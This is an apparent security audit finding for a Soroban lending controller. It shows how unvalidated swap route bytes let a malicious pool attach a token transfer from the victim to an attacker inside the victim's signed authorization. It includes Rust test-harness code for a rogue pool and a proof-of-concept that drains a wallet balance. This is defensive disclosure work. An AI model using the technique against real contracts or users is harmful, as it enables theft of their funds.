### Title
Caller-supplied swap routes can attach arbitrary wallet-token transfers to the caller’s authorization - (File: contracts/controller/src/strategies/swap.rs)

### Summary

`swap_collateral`, `swap_debt`, `repay_debt_with_collateral`, and `multiply` accept caller-supplied route bytes and execute them through the configured swap router after authenticating the caller and account. [1](#0-0) [2](#0-1)  The controller constrains only its own exact input transfer to the router and the router’s measured output; it does not restrict which contracts the route causes to execute beneath the caller’s authorization. [3](#0-2) [4](#0-3)  Consequently, a malicious route can put a contract on the call stack that requests `token.transfer(victim, attacker, amount)`, and Soroban records that transfer as a child of the victim’s signed strategy authorization. [5](#0-4) 

### Finding Description

`process_swap_collateral` authenticates `caller` and verifies that the caller owns or delegates the account, but then passes the supplied `swap` payload into `withdraw_and_swap_from_supply`. [1](#0-0) [6](#0-5) 

The common swap helper forwards the unchanged `swap` payload to the configured router through `execute_strategy`. [3](#0-2)  Its authorization is limited to one controller-to-router transfer of `amount_in`, and the subsequent checks only bound the controller’s input spend and require positive measured output. [4](#0-3) 

Those checks do not prevent route-selected code from initiating a separate authorization request against the original caller. [7](#0-6)  The repository’s authorization test demonstrates that simulation attaches a rogue pool’s `wallet_token.transfer(Alice, attacker, WALLET_BALANCE)` as a child of Alice’s `swap_collateral` invocation. [5](#0-4)  If Alice signs that recorded authorization tree, the unrelated wallet-token transfer executes and the attacker receives the full wallet balance while the strategy itself still succeeds. [8](#0-7) [9](#0-8) 

### Impact Explanation

This permits theft of arbitrary token balances held by the strategy caller, including tokens unrelated to the supplied collateral or the lending markets. [10](#0-9)  The loss is not bounded by `amount_in`, route output, slippage, or the account’s final health because it is a separate caller-authorized transfer performed by route-selected code. [4](#0-3) 

A malicious pool can also return enough output for the controller’s measured-output and final-risk checks to pass, so the account operation can appear economically normal while an unrelated wallet asset is drained. [8](#0-7) 

### Likelihood Explanation

The exploit requires the victim to sign an authorization tree containing the malicious child transfer, so an attacker cannot unilaterally execute it against an unsigned account. [11](#0-10)  The attack is nevertheless practical when a malicious interface, quote, or transaction builder supplies opaque route bytes and the wallet does not clearly distinguish unrelated child token transfers from the expected strategy authorization. [12](#0-11) 

The same raw route parameter is exposed through all four swap-backed strategy entrypoints, giving the payload multiple user-facing injection paths. [13](#0-12) [14](#0-13) [15](#0-14) [16](#0-15) 

### Recommendation

Constrain every route-selected venue or pool contract to a governance-controlled allowlist before the router calls it, rather than treating arbitrary payload addresses as executable code. [3](#0-2)  Keep the existing measured-input and measured-output checks, but additionally require route metadata to commit to the exact venue addresses used during simulation. [4](#0-3) 

Until protocol-level allowlisting exists, clients should simulate the exact route, decode the resulting authorization tree, and reject any child invocation that is not the single expected input-token transfer or another explicitly expected venue authorization. [5](#0-4) 

### Proof of Concept

1. The victim owns a normal account with `USDC` collateral and also holds an unrelated `WALLET` token. [17](#0-16) 
2. The attacker provides route bytes for `swap_collateral(victim, account_id, USDC, amount, ETH, route)` whose route calls an attacker-controlled pool contract. [18](#0-17) [19](#0-18) 
3. During the nested route call, the malicious pool invokes `WALLET.transfer(victim, attacker, WALLET_BALANCE)`. [20](#0-19) 
4. Simulation records that wallet transfer as a child authorization beneath the victim’s `swap_collateral` call. [5](#0-4) 
5. With the honest root-only authorization, the host rejects the rogue transfer and preserves the wallet balance. [21](#0-20) 
6. With the poisoned authorization tree signed, the same transaction moves `WALLET_BALANCE` to the attacker while crediting the expected `ETH` output to the victim’s position. [22](#0-21)

### Citations

**File:** contracts/controller/src/strategies/swap_collateral.rs (L40-48)
```rust
    require_authorized_caller(env, caller);

    assert_with_error!(env, current != new, GenericError::AssetsAreTheSame);
    config::require_hub_active(env, current.hub_id);
    require_positive_amount(env, from_amount);

    let mut account = storage::get_account(env, account_id);
    account::require_owner_or_delegate(env, account_id, caller, &account.owner);
    let mut cache = Context::new(env);
```

**File:** contracts/controller/src/strategies/swap_collateral.rs (L55-64)
```rust
    let swapped_amount = withdraw_and_swap_from_supply(
        env,
        &mut account,
        &mut cache,
        caller,
        current,
        from_amount,
        &new.asset,
        swap,
        events::PositionAction::SwColWd,
```

**File:** contracts/controller/src/lib.rs (L225-236)
```rust
    fn multiply(
        env: Env,
        caller: Address,
        account_id: u64,
        spoke_id: u32,
        collateral: HubAssetKey,
        debt_to_flash_loan: i128,
        debt: HubAssetKey,
        mode: PositionMode,
        swap: Bytes,
        initial_payment: Option<(HubAssetKey, i128)>,
        convert_swap: Option<Bytes>,
```

**File:** contracts/controller/src/lib.rs (L258-265)
```rust
    fn swap_debt(
        env: Env,
        caller: Address,
        account_id: u64,
        existing_debt: HubAssetKey,
        amount: i128,
        new_debt: HubAssetKey,
        swap: Bytes,
```

**File:** contracts/controller/src/lib.rs (L280-291)
```rust
    /// Withdraws `amount` of `current`, converts it to `new` via `swap` and
    /// redeposits the proceeds. Requires owner or delegate authorization.
    #[when_not_paused]
    fn swap_collateral(
        env: Env,
        caller: Address,
        account_id: u64,
        current: HubAssetKey,
        amount: i128,
        new: HubAssetKey,
        swap: Bytes,
    ) {
```

**File:** contracts/controller/src/lib.rs (L311-319)
```rust
    fn repay_debt_with_collateral(
        env: Env,
        caller: Address,
        account_id: u64,
        collateral: HubAssetKey,
        collateral_amount: i128,
        debt: HubAssetKey,
        swap: Bytes,
        close_position: bool,
```

**File:** contracts/controller/src/strategies/swap.rs (L29-38)
```rust
    // Snapshot before router execution to measure its spend and output.
    let in_before = token_in_client.balance(&controller);
    let out_before = token::Client::new(env, token_out).balance(&controller);

    // Authorize only this token transfer to this router for this exact amount.
    authorize_transfer_as_current(env, token_in, &controller, &router_addr, amount_in);

    storage::with_flash_guard(env, || {
        let _ = router.execute_strategy(&controller, &amount_in, swap);
    });
```

**File:** contracts/controller/src/strategies/swap.rs (L40-54)
```rust
    // Reject input gains or overspending; refund only this swap's unused input.
    let in_after = token_in_client.balance(&controller);
    assert_with_error!(env, in_after <= in_before, StrategyError::RouterOverspend);
    let actual_spent = in_before - in_after;
    assert_with_error!(
        env,
        actual_spent <= amount_in,
        StrategyError::RouterOverspend
    );
    let leftover = amount_in - actual_spent;
    if leftover > 0 {
        token_in_client.transfer(&controller, refund_to, &leftover);
    }

    verify_router_output(env, token_out, out_before)
```

**File:** tests/test-harness/tests/strategy/rogue_hop_pool_transfer_joins_caller_auth_tree.rs (L62-70)
```rust
    pub fn swap(env: Env) {
        let (victim, wallet_token, to, amount): (Address, Address, Address, i128) = env
            .storage()
            .instance()
            .get(&symbol_short!("PLAN"))
            .expect("plan is set by the constructor");
        if amount > 0 {
            token::Client::new(&env, &wallet_token).transfer(&victim, &to, &amount);
        }
```

**File:** tests/test-harness/tests/strategy/rogue_hop_pool_transfer_joins_caller_auth_tree.rs (L83-101)
```rust
    /// Debt-free Alice with 10 000 USDC supplied and an unrelated token in her wallet.
    fn new() -> Self {
        let mut t = LendingTest::new().standard_two_asset().build();
        t.supply(ALICE, "USDC", 10_000.0);
        let alice = t.get_or_create_user(ALICE);
        let account_id = t.resolve_account_id(ALICE);

        let router = t.env.register(UnlistedPoolRouter, ());
        t.ctrl_client().set_swap_aggregator(&router);
        t.resolve_market("ETH")
            .token_admin
            .mint(&router, &(4 * FAIR_OUT_ETH));

        let wallet_token = t
            .env
            .register_stellar_asset_contract_v2(t.admin.clone())
            .address();
        token::StellarAssetClient::new(&t.env, &wallet_token).mint(&alice, &WALLET_BALANCE);
        let attacker = Address::generate(&t.env);
```

**File:** tests/test-harness/tests/strategy/rogue_hop_pool_transfer_joins_caller_auth_tree.rs (L111-124)
```rust
    fn route_through_pool_stealing(&self, amount: i128) -> Bytes {
        let plan = (
            self.alice.clone(),
            self.wallet_token.clone(),
            self.attacker.clone(),
            amount,
        );
        RoutedSwap {
            hop_pool: self.t.env.register(RogueHopPool, plan),
            min_out: FAIR_OUT_ETH,
            token_in: self.t.resolve_asset("USDC"),
            token_out: self.t.resolve_asset("ETH"),
        }
        .to_xdr(&self.t.env)
```

**File:** tests/test-harness/tests/strategy/rogue_hop_pool_transfer_joins_caller_auth_tree.rs (L147-157)
```rust
    fn try_swap(&self, route: &Bytes) -> Result<(), soroban_sdk::Error> {
        let (usdc, eth) = self.assets();
        let ctrl = self.t.ctrl_client();
        let result = ctrl.try_swap_collateral(
            &self.alice,
            &self.account_id,
            &usdc,
            &SWAP_IN_USDC,
            &eth,
            route,
        );
```

**File:** tests/test-harness/tests/strategy/rogue_hop_pool_transfer_joins_caller_auth_tree.rs (L206-226)
```rust
    let stolen_transfer = AuthorizedInvocation {
        function: AuthorizedFunction::Contract((
            s.wallet_token.clone(),
            symbol_short!("transfer"),
            (s.alice.clone(), s.attacker.clone(), WALLET_BALANCE).into_val(&s.t.env),
        )),
        sub_invocations: std::vec![],
    };
    let poisoned_root = AuthorizedInvocation {
        function: AuthorizedFunction::Contract((
            s.t.controller.clone(),
            Symbol::new(&s.t.env, "swap_collateral"),
            s.swap_args(&route),
        )),
        sub_invocations: std::vec![stolen_transfer],
    };
    assert_eq!(recorded, std::vec![(s.alice.clone(), poisoned_root)]);

    assert_eq!(s.wallet(&s.alice), 0);
    assert_eq!(s.wallet(&s.attacker), WALLET_BALANCE);
    assert_eq!(s.t.supply_balance_raw(ALICE, "ETH"), FAIR_OUT_ETH);
```

**File:** tests/test-harness/tests/strategy/rogue_hop_pool_transfer_joins_caller_auth_tree.rs (L239-255)
```rust
    // Rogue pool, honest tree: the host refuses the transfer and the whole call rolls back.
    s.t.env.mock_all_auths_allowing_non_root_auth();
    let rogue = s.route_through_pool_stealing(WALLET_BALANCE);
    let usdc_before = s.t.supply_balance_raw(ALICE, "USDC");
    let refused = s
        .try_swap_with_signed_tree(&rogue, &[])
        .expect_err("a transfer outside the signed tree is unauthorized");
    std::println!("rogue transfer under the honest tree = {refused:?}");
    assert!(
        refused.is_type(ScErrorType::Auth) || refused.is_type(ScErrorType::Context),
        "expected a host auth failure, got {refused:?}"
    );
    assert!(s
        .diagnostics()
        .contains("Unauthorized function call for address"));
    assert_eq!(s.wallet(&s.alice), WALLET_BALANCE);
    assert_eq!(s.wallet(&s.attacker), 0);
```

**File:** tests/test-harness/tests/strategy/rogue_hop_pool_transfer_joins_caller_auth_tree.rs (L258-268)
```rust
    // Same route, with the tree that simulation returned.
    let stolen_transfer = MockAuthInvoke {
        contract: &s.wallet_token,
        fn_name: "transfer",
        args: (s.alice.clone(), s.attacker.clone(), WALLET_BALANCE).into_val(&s.t.env),
        sub_invokes: &[],
    };
    s.try_swap_with_signed_tree(&rogue, core::slice::from_ref(&stolen_transfer))
        .expect("the poisoned tree authorizes the rogue transfer");
    assert_eq!(s.wallet(&s.alice), 0);
    assert_eq!(s.wallet(&s.attacker), WALLET_BALANCE);
```
